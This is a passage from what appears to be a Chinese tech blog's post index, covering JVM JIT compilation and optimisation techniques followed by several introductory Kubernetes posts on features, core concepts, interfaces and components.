J9（也支持AOT）；有的JVM没有解释器，只支持AOT+JIT或者纯AOT，例如：Excelsior JET\n以HotSpot JVM举例，JIT还可以分为C1, C2等。C1编译快，执行效率低；C2编译慢，效率高。可以通过 -XX:+TieredCompilation 开启分层编译，对热点代码先C1编译以尽快进入到编译执行模式；随着应用继续运行，收集到足够多的指标后，再进行C2编译，以期获得最好的执行效率。\nJIT在编译过程中会采用一些优化手段，包括：公共子表达式消除、数组范围检查消除、方法内联、逃逸分析（目的是栈上分配、同步消除、标量替换、循环变型、窥孔优化与寄存器分配）\n1. 编译器与解释器 不做特别说明的话，我们讲的，\n编译器：程序运行前将其编译成机器码的程序\n解释器：程序运作中逐行解释源码得到结果的程序\n 特别注意的是，解释器也是一个程序，输入源码，输出结果，并没有显示的将源码转换成机器码的过程 解释器与 JIT  无论是编译器还是解释器，从 源码 到结果都需要将源码经过：词法分析 -\u0026gt; 语法分析 -\u0026gt; 语义分析 处理，\n一个比较简单的编译器的处理步骤看起来：\n编译流程： 源码 [字符流] - 词法分析 -\u0026gt; 单词（token）流 - 语法分析 -\u0026gt; 语法树 / 抽象语法树 - 语义分析 -\u0026gt; 标注了属性的抽象语法树 - 代码生成 -\u0026gt; 目标代码 执行流程： 目标代码 - 操作系统/硬件 -\u0026gt; 执行结果 狭义的解释器处理步骤看起来：\n解释执行流程： 源码 [字符流] - 需要做词法分析+语法分析+类型检查的字符流解释器 -\u0026gt; 执行结果  特别注意的是，解释器真正的输入往往并直接是源码，使用解释器实现的编程语言实现里，通常：\n 至少会在解释执行前做完语法分析，然后通过树解释器来实现解释执行； 兼顾易于实现、跨平台、执行效率这几点，会选择使用字节码解释器实现解释执行。  为什么大多数解释器都将AST转化成字节码再用虚拟机执行，而不是直接解释AST？  2. 解释型语言 很多资料会说，Python、Ruby、JavaScript都是“解释型语言”，是通过解释器来实现的。这么说其实很容易引起误解：语言一般只会定义其抽象语义，而不会强制性要求采用某种实现方式。\n例如说C一般被认为是“编译型语言”，但C的解释器也是存在的，例如Ch 。同样，C++也有解释器版本的实现，例如Cint 。\n一般被称为“解释型语言”的是主流实现为解释器的语言，但并不是说它就无法编译。例如说经常被认为是“解释型语言”的Scheme 就有好几种编译器实现，其中率先支持R6RS 规范的大部分内容的是Ikarus ，支持在x86上编译Scheme；它最终不是生成某种虚拟机的字节码，而是直接生成x86机器码。\n虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩 3. JVM是否JIT全程编译？  HotSpot VM、J9 VM：不是，这两个JVM默认用混合模式执行引擎，以解释为基础，然后对热点做编译；这两者同时还支持AOT编译执行。J9 VM对AOT编译的支持早就有了；HotSpot VM的将在JDK9的某个更新版中发布，请参考Java Goes AOT （打不开请自备工具…） JRockit VM：是，JRockit VM没有解释器，只能对所有Java方法都做JIT编译； Jikes RVM 、Maxine VM 、Jato VM 等：是，跟JRockit类似，只有JIT编译器而没有解释器，因而只能JIT编译执行； Excelsior JET ：不是，可配置为用纯AOT编译，或者AOT+JIT编译执行。  4. 为什么有些JVM会选择不总是做JIT编译，而是选择用解释器+JIT编译器的混合执行引擎 1. 编译的时间开销 解释器的执行，抽象的看是这样的：\n输入的代码 -\u0026gt; [ 解释器 解释执行 ] -\u0026gt; 执行结果 而要JIT编译然后再执行的话，抽象的看则是：\n输入的代码 -\u0026gt; [ 编译器 编译 ] -\u0026gt; 编译后的代码 -\u0026gt; [ 执行 ] -\u0026gt; 执行结果 说JIT比解释快，其实说的是“执行编译后的代码”比“解释器解释执行”要快，并不是说“编译”这个动作比“解释”这个动作快。\n然而这JIT编译再怎么快，至少也比解释执行一次略慢一些，而要得到最后的执行结果还得再经过一个“执行编译后的代码”的过程。\n所以，对“只执行一次”的代码而言，解释执行其实总是比JIT编译执行要快。 怎么算是“只执行一次的代码”呢？粗略说，下面两个条件同时满足时就是严格的“只执行一次”\n 只被调用一次，例如类的初始化器（class initializer，()V） 没有循环  对只执行一次的代码做JIT编译再执行，可以说是得不偿失。 对只执行少量次数的代码，JIT编译带来的执行速度的提升也未必能抵消掉最初编译带来的开销。 只有对频繁执行的代码，JIT编译才能保证有正面的收益。\n况且，并不是说JIT编译了的代码就一定会比解释执行快。切不可盲目认为有了JIT就可以鄙视解释器了，还是得看实现细节如何。 有个很经典的例子：LuaJIT 2里有一个实现得非常优化的解释器，它解释执行的速度甚至比LuaJIT 1的JIT编译后的代码的速度还要快。\n2. 编译的空间开销 举个最简单的例子：\npublic static int foo() { return 42; } 其字节码大小只有3字节：\npublic static int foo(); Code: stack=1, locals=0, args_size=0 0: bipush 42 2: ireturn 而由Linux/x86-64上的HotSpot VM的Server Compiler将其编译为机器码后，则膨胀到了56字节：\n# {method} \u0026#39;foo\u0026#39; \u0026#39;()I\u0026#39; in \u0026#39;XX\u0026#39; # [sp+0x20] (sp of caller) 0x00000001017b8200: sub $0x18,%rsp 0x00000001017b8207: mov %rbp,0x10(%rsp) ;*synchronization entry ; - XX::foo@-1 (line 3) 0x00000001017b820c: mov $0x2a,%eax 0x00000001017b8211: add $0x10,%rsp 0x00000001017b8215: pop %rbp 0x00000001017b8216: test %eax,-0x146021c(%rip) # 0x0000000100358000 ; {poll_return} 0x00000001017b821c: retq 0x00000001017b821d: hlt 0x00000001017b821e: hlt 0x00000001017b821f: hlt [Exception Handler] [Stub Code] 0x00000001017b8220: jmpq 0x00000001017b50a0 ; {no_reloc} [Deopt Handler Code] 0x00000001017b8225: callq 0x00000001017b822a 0x00000001017b822a: subq $0x5,(%rsp) 0x00000001017b822f: jmpq 0x000000010178eb00 ; {runtime_call} 0x00000001017b8234: hlt 0x00000001017b8235: hlt 0x00000001017b8236: hlt 0x00000001017b8237: hlt 对一般的Java方法而言，编译后代码的大小相对于字节码的大小，膨胀比达到10x是很正常的。上面的例子比较极端一些，但还是很能反映现实状况的。\n同上面说的时间开销一样，这里的空间开销也是，只有对执行频繁的代码才值得编译，如果把所有代码都编译则会显著增加代码所占空间，导致“代码爆炸”（code size explosion）。\n3. 编译时机对优化的影响 有些JIT编译器非常简单，基本上不做啥优化，也倒也没啥影响。\n但现代做优化的JIT编译器都非常注重使用profile信息，而profile是需要通过执行用户程序来获取的。\n这样，编译得太早的话，就来不及收集足够profile信息，进而会影响优化的效果；而编译太迟的话，即便收集了很多高质量的profile，但却也已经付出了profile的额外开销，编译出来的代码再快或许也弥补不过来了。\n在解释器里实现收集profile的功能，等解释执行一段时间后再触发JIT编译，这样就可以很好的平衡收集profile与编译优化这两方面。\n当然，收集profile也可以在JIT编译器里做：一开始先JIT编译生成收集profile的版本的代码，等收集了到足够profile后触发重新编译，再生成出优化的、不带profile的版本。JRockit基本上就是这样做的。\n为什么 JVM 不用 JIT 全程编译？ 5. Java的执行过程 Java的执行过程整体可以分为两个部分，第一步由javac将源码编译成字节码，在这个过程中会进行词法分析、语法分析、语义分析，编译原理中这部分的编译称为前端编译。接下来无需编译直接逐条将字节码解释执行，在解释执行的过程中，虚拟机同时对程序运行的信息进行收集，在这些信息的基础上，编译器会逐渐发挥作用，它会进行后端编译——把字节码编译成机器码，但不是所有的代码都会被编译，只有被JVM认定为的热点代码，才可能被编译。\n怎么样才会被认为是热点代码呢？JVM中会设置一个阈值，当方法或者代码块的在一定时间内的调用次数超过这个阈值时就会被编译，存入codeCache中。当下次执行时，再遇到这段代码，就会从codeCache中读取机器码，直接执行，以此来提升程序运行的性能。整体的执行过程大致如下图所示：\n6. JVM Client 模式和 Server模式的区别 通过 java -version 可查看 JVM 所处的模式，并可以通过修改配置文件进行配置，那它们有什么区别呢？\nServer：-Server 模式启动时，速度较慢，但是启动之后，性能更高，适合运行服务器后台程序\nClient：-Client 模式启动时，速度较快，启动之后不如 Server，适合用于桌面等有界面的程序\n7. 即时编译器的分类  Client Compiler - C1编译器 Server Compiler - C2编译器、Graal Compiler  目前主流的 HotSpot 虚拟机（JDK1.7 及之前版本的虚拟机）默认采用一个解释器和其中一个编译器直接配合的方式工作，程序使用哪个编译器，取决于虚拟机运行的模式，就是文章开头提到的两种模式。\n在 HotSpot 中，解释器和 JIT 即时编译器是同时存在的，他们是 JVM 的两个组件。对于不同类型的应用程序，用户可以根据自身的特点和需求，灵活选择是基于解释器运行还是基于 JIT 编译器运行。HotSpot 为用户提供了几种运行模式供选择，可通过参数设定，分别为：解释模式、编译模式、混合模式，HotSpot 默认是混合模式，需要注意的是编译模式并不是完全通过 JIT 进行编译，只是优先采用编译方式执行程序，但是解释器仍然要在编译无法进行的情况下介入执行过程。\n8. 分层编译 产生的原因：由于即时编译器编译本地代码需要占用程序运行时间，要编译出优化程度更高的代码，所花费的时间可能更长；而且要想编译出优化程度更高的代码，解释器可能还要替编译器收集性能监控信息，这对解释执行的速度也有影响。为了在程序启动响应速度与运行效率之间达到最佳平衡，HotSpot 虚拟机启用分层编译的策略\n分层编译根据编译器编译、优化的规模与耗时，划分出不同的编译层次：\n 第 0 层：程序解释执行，解释器不开启性能监控功能，可触发第 1 层编译。 第 1 层：也称为 C1 编译，将字节码编译为本地代码，进行简单，可靠的优化，如有必要将加入性能监控的逻辑。 第 2 层（或 2 层以上）：也称为 C2 编译，也是将字节码编译为本地代码，但是会启用一些编译耗时较长的优化，甚至会根据性能监控信息进行一些不可靠的激进优化。  实施分层编译后，Client Compiler 和 Server Compiler 将会同时工作，许多代码都可能会被多次编译看，用 Client Compiler 获取更高的编译速度，用 Server Compiler 获取更好的编译质量，在解释执行的时候也无须再承担收集性能监控信息的任务\n9. 热点代码 1. 热点代码的分类  被多次调用的方法  一个方法被调用得多了，方法体内代码执行的次数自然就多，成为“热点代码”是理所当然的。\n 被多次执行的循环体  一个方法只被调用过一次或少量的几次，但是方法体内部存在循环次数较多的循环体，这样循环体的代码也被重复执行多次，因此这些代码也应该认为是“热点代码”。\n2. 如何检测热点代码 判断一段代码是否是热点代码，是否需要触发即使编译，这样的行为称为热点探测，热点探测并不一定知道方法具体被调用了多少次，目前主要的热点探测判定方式有两种：\n 基于采样的热点探测：采用这种方法的虚拟机会周期性地检查各个线程的栈顶如果发现某个（或某些）方法经常出现在栈顶，那这个方法就是“热点方法”   优点：实现简单高效，容易获取方法调用关系（将调用堆栈展开即可）\n缺点：不精确，容易因为因为受到线程阻塞或别的外界因素的影响而扰乱热点探测\n  基于计数器的热点探测：采用这种方法的虚拟机会为每个方法（甚至是代码块）建立计数器，统计方法的执行次数，如果次数超过一定的阈值就认为它是“热点方法”   优点：统计结果精确严谨\n缺点：实现麻烦，需要为每个方法建立并维护计数器，不能直接获取到方法的调用关系\n HotSpot使用第二种 - 基于计数器的热点探测方法。\n确定了检测热点代码的方式，如何计算具体的次数呢？\n3. 计数器的种类（两种共同协作）  方法调用计数器：这个计数器用于统计方法被调用的次数。默认阈值在 Client 模式下是 1500 次，在 Server 模式下是 10000 次 回边计数器：统计一个方法中循环体代码执行的次数  了解了热点代码和计数器有什么用呢？达到计数器的阈值会触发后文讲解的即时编译，也就是说即时编译是需要达到某种条件才会触发的。\n10. 编译优化技术 1. 语言无关的经典优化技术之一：公共子表达式消除 如果一个表达式 E 已经计算过了，并且从先前的计算到现在 E 中所有变量的值都没有发生变化，那么 E 的这次出现就成为了公共子表达式。对于这种表达式，没必要花时间再对它进行计算，只需要直接使用前面计算过的表达式结果代替 E 就可以了。例子：int d = (c*b) * 12 + a + (a+ b * c) -\u0026gt; int d = E * 12 + a + (a+ E)\n2. 语言相关的经典优化技术之一：数组范围检查消除 在 Java 语言中访问数组元素的时候系统将会自动进行上下界的范围检查，超出边界会抛出异常。对于虚拟机的执行子系统来说，每次数组元素的读写都带有一次隐含的条件判定操作，对于拥有大量数组访问的程序代码，这无疑是一种性能负担。Java 在编译期根据数据流分析可以判定范围进而消除上下界检查，节省多次的条件判断操作。\n3. 最重要的优化技术之一：方法内联 简单的理解为把目标方法的代码“复制”到发起调用的方法中，消除一些无用的代码。\n方法内联，是指在编译过程中遇到方法调用时，将目标方法的方法体纳入编译范围之中，并取代原方法调用的优化手段。JIT大部分的优化都是在内联的基础上进行的，方法内联是即时编译器中非常重要的一环。\nJava服务中存在大量getter/setter方法，如果没有方法内联，在调用getter/setter时，程序执行时需要保存当前方法的执行位置，创建并压入用于getter/setter的栈帧、访问字段、弹出栈帧，最后再恢复当前方法的执行。内联了对 getter/setter的方法调用后，上述操作仅剩字段访问。在C2编译器 中，方法内联在解析字节码的过程中完成。当遇到方法调用字节码时，编译器将根据一些阈值参数决定是否需要内联当前方法的调用。如果需要内联，则开始解析目标方法的字节码。比如下面这个示例（来源于网络）：\n方法内联的过程\npublic static boolean flag = true; public static int value0 = 0; public static int value1 = 1; public static int foo(int value) { int result = bar(flag); if (result != 0) { return result; } else { return value; } } public static int bar(boolean flag) { return flag ? value0 : value1; } bar方法的IR图：\n内联后的IR图：\n4. 最前沿的优化技术之一：逃逸分析 逃逸分析的基本行为就是分析对象动态作用域：当一个对象在方法中杯定义后，它可能被外部方法所引用，例如作为调用参数传递到其他方法中，称为方法逃逸。甚至可能被外部线程访问到，譬如赋值给类变量或可以在其他线程中访问的实例变量，称为线程逃逸。\n如果能证明一个对象不会逃逸到方法或线程之外，也就是别的方法或线程无法通过任何途径访问到这个对象，则可以为这个变量进行一些高效的优化：\n 栈上分配：将不会逃逸的局部对象分配到栈上，那对象就会随着方法的结束而自动销毁，减少垃圾收集系统的压力。 同步消除：如果该变量不会发生线程逃逸，也就是无法被其他线程访问，那么对这个变量的读写就不存在竞争，可以将同步措施消除掉（同步是需要付出代价的） 标量替换：标量是指无法在分解的数据类型，比如原始数据类型以及reference类型。而聚合量就是可继续分解的，比如 Java 中的对象。标量替换如果一个对象不会被外部访问，并且对象可以被拆散的话，真正执行时可能不创建这个对象，而是直接创建它的若干个被这个方法使用到的成员变量来代替。这种方式不仅可以让对象的成员变量在栈上分配和读写，还可以为后后续进一步的优化手段创建条件。  下面是一个标量替换的例子：\npublic class Example{ @AllArgsConstructor class Cat{ int age; int weight; } public static void example(){ Cat cat = new Cat(1,10); addAgeAndWeight(cat.age,Cat.weight); } } 经过逃逸分析，cat对象未逃逸出example()的调用，因此可以对聚合量cat进行分解，得到两个标量age和weight，进行标量替换后的伪代码：\npublic class Example{ @AllArgsConstructor class Cat{ int age; int weight; } public static void example(){ int age = 1; int weight = 10; addAgeAndWeight(age,weight); } } 5. Loop Transformations C2编译器在构建Ideal Graph后会进行很多的全局优化，其中就包括对循环的转换，最重要的两种转换就是循环展开和循环分离。\n1. 循环展开 循环展开是一种循环转换技术，它试图以牺牲程序二进制码大小为代价来优化程序的执行速度，是一种用空间换时间的优化手段。\n循环展开通过减少或消除控制程序循环的指令，来减少计算开销，这种开销包括增加指向数组中下一个索引或者指令的指针算数等。如果编译器可以提前计算这些索引，并且构建到机器代码指令中，那么程序运行时就可以不必进行这种计算。也就是说有些循环可以写成一些重复独立的代码。比如下面这个循环：\npublic void loopRolling(){ for(int i = 0;i\u0026lt;200;i++){ delete(i); } } 上面的代码需要循环删除200次，通过循环展开可以得到下面这段代码：\npublic void loopRolling(){ for(int i = 0;i\u0026lt;200;i+=5){ delete(i); delete(i+1); delete(i+2); delete(i+3); delete(i+4); } } 这样展开就可以减少循环的次数，每次循环内的计算也可以利用CPU的流水线提升效率。当然这只是一个示例，实际进行展开时，JVM会去评估展开带来的收益，再决定是否进行展开。\n2. 循环分离 循环分离也是循环转换的一种手段。它把循环中一次或多次的特殊迭代分离出来，在循环外执行。举个例子，下面这段代码：\nint a = 10; for(int i = 0;i\u0026lt;10;i++){ b[i] = x[i] + x[a]; a = i; } 可以看出这段代码除了第一次循环a = 10以外，其他的情况a都等于i-1。所以可以把特殊情况分离出去，变成下面这段代码：\nb[0] = x[0] + 10; for(int i = 1;i\u0026lt;10;i++){ b[i] = x[i] + x[i-1]; } 这种等效的转换消除了在循环中对a变量的需求，从而减少了开销。\n6. 窥孔优化与寄存器分配 前文提到的窥孔优化是优化的最后一步，这之后就会程序就会转换成机器码，窥孔优化就是将编译器所生成的中间代码（或目标代码）中相邻指令，将其中的某些组合替换为效率更高的指令组，常见的比如强度削减、常数合并等，看下面这个例子就是一个强度削减的例子：\n强度削减\ny1=x1*3 经过强度削减后得到 y1=(x1\u0026lt;\u0026lt;1)+x1 编译器使用移位和加法削减乘法的强度，使用更高效率的指令组。\n寄存器分配也是一种编译的优化手段，在C2编译器中普遍的使用。它是通过把频繁使用的变量保存在寄存器中，CPU访问寄存器的速度比内存快得多，可以提升程序的运行速度。\n寄存器分配和窥孔优化是程序优化的最后一步。经过寄存器分配和窥孔优化之后，程序就会被转换成机器码保存在codeCache中。\n参考： 基本功 | Java即时编译器原理解析及实践 你了解JVM中的 JIT 即时编译及优化技术吗？ 虚拟机随谈（一）：解释器，树遍历解释器，基于栈与基于寄存器，大杂烩 Java为什么解释执行时不直接解释源码？ 为什么大多数解释器都将AST转化成字节码再用虚拟机执行，而不是直接解释AST？ 为什么 JVM 不用 JIT 全程编译？ jvm调优之分层编译 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/jit%E5%8D%B3%E6%97%B6%E7%BC%96%E8%AF%91/","series":["Manual"],"tags":["Java"],"title":"JIT即时编译"},{"categories":["云原生"],"content":"Kubernetes提供了一个可弹性运行分布式系统的框架。Kubernetes 会满足您的扩展要求、故障转移、部署模式等。具体如下：\n Service discovery and load balancing，服务发现和负载均衡，通过DNS实现内部解析，service实现负载均衡 Storage orchestration，存储编排，通过plungin的形式支持多种存储，如本地，nfs，ceph，公有云快存储等 Automated rollouts and rollbacks，自动发布与回滚，通过匹配当前状态与目标状态一致，更新失败时可回滚 Automatic bin packing，自动资源调度，可以设置pod调度的所需（requests）资源和限制资源（limits） Self-healing，内置的健康检查策略，自动发现和处理集群内的异常，更换，需重启的pod节点 Secret and configuration management，密钥和配置管理，对于敏感信息如密码，账号的那个通过secret存储，应用的配置文件通过configmap存储，避免将配置文件固定在镜像中，增加容器编排的灵活性 Batch execution，批处理执行，通过job和cronjob提供单次批处理任务和循环计划任务功能的实现 Horizontal scaling，横向扩展功能，包含有HPA和AS，即应用的基于CPU利用率的弹性伸缩和基于平台级的弹性伸缩，如自动增加node和删除nodes节点。   使用kubectl autoscale命令来创建一个 HPA 对象：\n$ kubectl autoscale deployment wordpress --namespace kube-example --cpu-percent=20 --min=3 --max=6 horizontalpodautoscaler.autoscaling/hpa-demo autoscaled $ kubectl get hpa -n kube-example NAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGE wordpress Deployment/wordpress \u0026lt;unknown\u0026gt;/20% 3 6 0 13s 此命令创建了一个关联资源 wordpress 的 HPA，最小的 Pod 副本数为3，最大为6。HPA 会根据设定的 cpu 使用率（20%）动态的增加或者减少 Pod 数量。\n ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E5%8A%9F%E8%83%BD/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s功能"},{"categories":["云原生"],"content":"1⃣️ Container Container（容器）是一种便携式、轻量级的操作系统级虚拟化技术。它使用 namespace 隔离不同的软件运行环境，并通过镜像自包含软件的运行环境，从而使得容器可以很方便的在任何地方运行。\n2⃣️ 2⃣️ Pod Kubernetes 使用 Pod 来管理容器，每个 Pod 可以包含一个或多个紧密关联的容器。\nPod 是一组紧密关联的容器集合，它们共享 PID（同一个Pod中应用可以看到其它进程）、IPC（同一个Pod中的应用可以通过VPC或者POSIX进行通信）、Network （同一个Pod的中的应用对相同的IP地址和端口有权限）和 UTS namespace（同一个Pod中的应用共享一个主机名称），是 Kubernetes 调度的基本单位。Pod 内的多个容器共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务。\n在 Kubernetes 中，所有对象都使用 manifest（yaml 或 json）来定义，比如一个简单的 nginx 服务可以定义为 nginx.yaml，它包含一个镜像为 nginx 的容器：\napiVersion: v1 kind: Pod metadata: name: nginx labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 3⃣️ Node Node 是 Pod 真正运行的主机，可以是物理机，也可以是虚拟机。为了管理 Pod，每个 Node 节点上至少要运行 container runtime（比如 docker 或者 rkt）、kubelet 和 kube-proxy 服务。\n4⃣️ Namespace Namespace 是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组。常见的 pods, services, replication controllers 和 deployments 等都是属于某一个 namespace 的（默认是 default），而 node, persistentVolumes 等则不属于任何 namespace。\n查看哪些 Kubernetes 资源在名字空间中，哪些不在名字空间中：\n# 位于名字空间中的资源 kubectl api-resources --namespaced=true # 不在名字空间中的资源 kubectl api-resources --namespaced=false 5⃣️ Service Service 是应用服务的抽象，通过 labels 为应用提供负载均衡和服务发现。匹配 labels 的 Pod IP 和端口列表组成 endpoints，由 kube-proxy 负责将服务 IP 负载均衡到这些 endpoints 上。\n每个 Service 都会自动分配一个 cluster IP（仅在集群内部可访问的虚拟地址）和 DNS 名，其他容器可以通过该地址或 DNS 来访问服务，而不需要了解后端容器的运行。\napiVersion: v1 kind: Service metadata: name: nginx spec: ports: - port: 8078 # the port that this service should serve on name: http # the container on each pod to connect to, can be a name # (e.g. \u0026#39;www\u0026#39;) or a number (e.g. 80) targetPort: 80 protocol: TCP selector: app: nginx 6⃣️ Label Label 是识别 Kubernetes 对象的标签，以 key/value 的方式附加到对象上（key 最长不能超过 63 字节，value 可以为空，也可以是不超过 253 字节的字符串）。\nLabel 不提供唯一性，并且实际上经常是很多对象（如 Pods）都使用相同的 label 来标志具体的应用。\nLabel 定义好后其他对象可以使用 Label Selector 来选择一组相同 label 的对象（比如 ReplicaSet 和 Service 用 label 来选择一组 Pod）。Label Selector 支持以下几种方式：\n 等式，如 app=nginx 和 env!=production 集合，如 env in (production, qa) 多个 label（它们之间是 AND 关系），如 app=nginx,env=test  7⃣️ Annotations Annotations 是 key/value 形式附加于对象的注解。不同于 Labels 用于标志和选择对象，Annotations 则是用来记录一些附加信息，用来辅助应用部署、安全策略以及调度策略等。比如 deployment 使用 annotations 来记录 rolling update 的状态。\napiVersion: extensions/v1beta1 kind: Ingress metadata: name: gray-release annotations: # 请求头中满足正则匹配foo=bar的请求才会被路由到新版本服务new-nginx中 nginx.ingress.kubernetes.io/service-match: | new-nginx: header(\u0026#34;foo\u0026#34;, /^bar$/) # 在满足上述匹配规则的基础上仅允许50%的流量会被路由到新版本服务new-nginx中 nginx.ingress.kubernetes.io/service-weight: | new-nginx: 50, old-nginx: 50 spec: rules: - host: www.example.com http: paths: # 老版本服务 - path: / backend: serviceName: old-nginx servicePort: 80 # 新版本服务 - path: / backend: serviceName: new-nginx servicePort: 80 参考链接\nhttps://feisky.gitbooks.io/kubernetes/content/introduction/concepts.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80%E6%89%AB%E7%9B%B2/k8s%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s基本概念"},{"categories":["云原生"],"content":"几种接口解释：\n  CRI（Container Runtime Interface）。容器运行时接口。Kubernetes项目并不关心你部署的是什么容器运行时、使用的什么技术实现，只要你的这个容器运行时能够运行标准的容器镜像，它就可以通过实现CRI接入到Kubernetes项目当中。Kubernetes是通过kubelet跟CRI进行通信。\n  OCI（Open Container Initiative） ：具体的容器运行时，比如Docker项目，则一般通过OCI这个容器运行时规范同底层的Linux操作系统进行交互，即：把CRI请求翻译成对Linux操作系统的调用（操作Linux Namespace和Cgroups等）。\n CRI是k8s对外暴露的抽象容器接口，OCI是开发容器倡议，最终CRI接口会调用符合OCI的系统内核接口\n容器生态三层抽象:\n Orchestration API -\u0026gt; Container API -\u0026gt; Kernel API\n  Orchestration API: kubernetes API标准就是这层的标准,无可非议 Container API: 标准就是CRI Kernel API: 标准就是OCI     CNI（Container Networking Interface）：调用网络插件做网络通信。\n  CSI（Container Storage Interface）：调用存储插件配置持久化存储。\n  kubelet还通过gRPC协议同一个叫作Device Plugin的插件进行交互。\n   以上几种接口都是kubelet所要支持的功能，所以计算节点上最核心的组件就是kubelet。\n ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E6%8E%A5%E5%8F%A3/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s接口"},{"categories":["云原生"],"content":"Kubernetes 主要由以下几个核心组件组成:\n etcd 保存了整个集群的状态，就是一个数据库； apiserver 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制； controller manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等； scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上； kubelet 负责维护容器的生命周期，同时也负责 Volume（CSI）和网络（CNI）的管理； Container runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI）； kube-proxy 负责为 Service 提供 cluster 内部的服务发现和负载均衡；  当然了除了上面的这些核心组件，还有一些推荐的插件：\n kube-dns 负责为整个集群提供 DNS 服务 Ingress Controller 为服务提供外网入口 Heapster 提供资源监控 Dashboard 提供 GUI  ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E6%9E%B6%E6%9E%84/","series":["k8s"],"tags":["云原生","k8s"],"title":"k8s架构"},{"categories":["云原生"],"content":"Master（控制平面）组件 1⃣️ 1⃣️ kube-apiserver  提供集群管理的 REST API 接口，包括认证授权、数据校验以及集群状态变更等 提供其他模块之间的数据交互和通信的枢纽（其他模块通过 API Server 查询或修改数据，只有 API Server 才直接操作 etcd）  2⃣️ 2⃣️ etcd etcd 是 CoreOS 基于 Raft 开发的分布式 key-value 存储，可用于服务发现、共享配置以及一致性保障（如数据库选主、分布式锁等）。\n主要功能🔧包括：\n 基本的 key-value 存储 监听机制 key 的过期及续约机制，用于监控和服务发现 原子 CAS 和 CAD，用于分布式锁和 leader 选举  Etcd，Zookeeper，Consul 比较 🆚：\n Etcd 和 Zookeeper 提供的能力非常相似，都是通用的一致性元信息存储，都提供 watch 机制用于变更通知和分发，也都被分布式系统用来作为共享信息存储，在软件生态中所处的位置也几乎是一样的，可以互相替代的。二者除了实现细节，语言，一致性协议上的区别，最大的区别在周边生态圈。Zookeeper 是 apache 下的，用 java 写的，提供 rpc 接口，最早从 hadoop 项目中孵化出来，在分布式系统中得到广泛使用（hadoop, solr, kafka, mesos 等）。Etcd 是 coreos 公司旗下的开源产品，比较新，以其简单好用的 rest 接口以及活跃的社区俘获了一批用户，在新的一些集群中得到使用（比如 kubernetes）。虽然 v3 为了性能也改成二进制 rpc 接口了，但其易用性上比 Zookeeper 还是好一些。 而 Consul 的目标则更为具体一些，Etcd 和 Zookeeper 提供的是分布式一致性存储能力，具体的业务场景需要用户自己实现，比如服务发现，比如配置变更。而 Consul 则以服务发现和配置变更为主要目标，同时附带了 kv 存储。  3⃣️ 3⃣️ kube-scheduler kube-scheduler 负责分配调度 Pod 到集群内的节点上，它监听 kube-apiserver，查询还未分配 Node 的 Pod，然后根据调度策略为这些 Pod 分配节点（更新 Pod 的 NodeName 字段）。\n调度器需要充分考虑🤔诸多的因素：\n 公平调度 资源高效利用 QoS affinity 和 anti-affinity 数据本地化（data locality） 内部负载干扰（inter-workload interference） deadlines  4⃣️ 4⃣️ kube-controller-manager kube-controller-manager 由一系列的控制器组成，这些控制器可以划分为三组\n  必须启动的控制器\n EndpointController: 填充端点(Endpoints)对象(即加入 Service 与 Pod) ReplicationController PodGCController ResourceQuotaController NamespaceController ServiceAccountController: 为新的命名空间创建默认帐户和 API 访问令牌 GarbageCollectorController DaemonSetController JobController：监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成 DeploymentController ReplicaSetController HPAController DisruptionController StatefulSetController CronJobController CSRSigningController CSRApprovingController TTLController    默认启动的可选控制器，可通过选项设置是否开启\n TokenController: 为新的命名空间创建 API 访问令牌 NodeController: 负责在节点出现故障时进行通知和响应 ServiceController RouteController PVBinderController AttachDetachController    默认禁止的可选控制器，可通过选项设置是否开启\n BootstrapSignerController TokenCleanerController    5⃣️ 5⃣️ cloud-controller-manager cloud-controller-manager 在 Kubernetes 启用 Cloud Provider 的时候才需要，用来配合云服务提供商的控制，也包括一系列的控制器\n CloudNodeController: 用于在节点终止响应后检查云提供商以确定节点是否已被删除 RouteController: 用于在底层云基础架构中设置路由 ServiceController: 用于创建、更新和删除云提供商负载均衡器  Node 组件 1⃣️ 1⃣️ Kubelet 每个Node节点上都运行一个 Kubelet 服务进程，默认监听 10250 端口，接收并执行 Master 发来的指令，管理 Pod 及 Pod 中的容器。每个 Kubelet 进程会在 API Server 上注册所在Node节点的信息，定期向 Master 节点汇报该节点的资源使用情况，并通过 cAdvisor 监控节点和容器的资源。管理节点 管理POD 管理容器 监控节点和容器\n2⃣️ 2⃣️ kube-proxy 每台机器上都运行一个 kube-proxy 服务，它监听 API server 中 service 和 endpoint 的变化情况，并通过 userspace、iptables、ipvs 或 winuserspace 等 proxier 来为服务配置负载均衡（仅支持 TCP 和 UDP）。\nkube-proxy 可以直接运行在物理机上，也可以以 static pod 或者 daemonset 的方式运行。\n 静态 Pod 除了 DaemonSet，还可以使用静态 Pod 